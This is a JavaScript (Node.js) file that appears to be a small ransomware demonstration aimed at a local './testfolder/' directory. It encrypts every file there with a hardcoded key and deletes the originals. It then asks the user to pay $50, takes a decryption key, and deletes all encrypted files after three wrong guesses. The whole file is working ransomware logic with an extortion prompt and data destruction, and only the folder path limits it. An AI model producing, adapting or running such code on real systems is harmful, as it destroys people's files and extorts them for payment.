const encryptor = require("file-encryptor");
const fs = require("fs");
const readline = require("readline");

const TestFolder = "./testfolder/";
const encryptKey = "Decryption00123";
let decryptKey = "";
let decryptionAttempts = 0;
const MAX_ATTEMPTS = 3;
const paymentAmount = 50; // Amount user needs to pay for decryption

async function encryptFiles() {
  const files = fs.readdirSync(TestFolder);
  for (const file of files) {
    await new Promise((resolve) => {
      encryptor.encryptFile(
        `${TestFolder}/${file}`,
        `${TestFolder}/${file}.encrypted`,
        encryptKey,
        function (err) {
          if (err) {
            console.error("Encryption error:", err);
          } else {
            fs.unlinkSync(`${TestFolder}/${file}`);
            console.log(`Encryption of ${file} is complete.`);
          }
          resolve();
        }
      );
    });
  }
}

function decryptFiles() {
  fs.readdirSync(TestFolder).forEach((file) => {
    encryptor.decryptFile(
      `${TestFolder}/${file}`,
      `${TestFolder}/${file.replace(".encrypted", "")}`,
      decryptKey,
      function (err) {
        if (err) {
          console.error("Decryption error:", err);
        } else {
          fs.unlinkSync(`${TestFolder}/${file}`);
          console.log(`Decryption of ${file} is complete.`);
        }
      }
    );
  });
}

function promptDecryptionKey() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  rl.question("Enter decryption key: ", (decryptAnswer) => {
    rl.close();
    if (decryptAnswer === encryptKey) {
      console.log("Decrypting files...");
      decryptKey = decryptAnswer;
      decryptFiles();
    } else {
      decryptionAttempts++;
      if (decryptionAttempts < MAX_ATTEMPTS) {
        console.log(
          `Incorrect decryption key. ${
            MAX_ATTEMPTS - decryptionAttempts
          } attempts remaining. Please try again.`
        );
        promptDecryptionKey();
      } else {
        console.log(
          "Exceeded maximum decryption attempts. Deleting encrypted files..."
        );
        deleteEncryptedFiles();
      }
    }
  });
}

function deleteEncryptedFiles() {
  fs.readdirSync(TestFolder).forEach((file) => {
    if (file.endsWith(".encrypted")) {
      fs.unlinkSync(`${TestFolder}/${file}`);
      console.log(`Deleted encrypted file ${file}.`);
    }
  });
}

function promptPayment() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  rl.question(
    `To decrypt your files, you need to pay $${paymentAmount}. Please enter 'pay' to continue: `,
    (paymentAnswer) => {
      rl.close();
      if (paymentAnswer.toLowerCase() === "pay") {
        promptDecryptionKey();
      } else {
        console.log("Payment required to proceed with decryption.");
        promptPayment();
      }
    }
  );
}

console.log("Encrypting files...");
encryptFiles().then(() => {
  promptPayment();
});
